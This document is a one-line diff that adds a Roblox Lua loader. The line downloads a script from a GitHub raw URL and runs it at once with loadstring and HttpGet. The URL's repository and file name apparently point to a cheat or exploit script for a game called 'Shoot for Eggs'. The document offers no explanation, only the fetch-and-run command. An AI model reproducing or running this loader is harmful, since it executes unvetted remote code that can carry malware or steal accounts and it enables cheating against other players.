@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/shoot-for-eggs-spam5-3mkwr641kt2v77.lua"))()
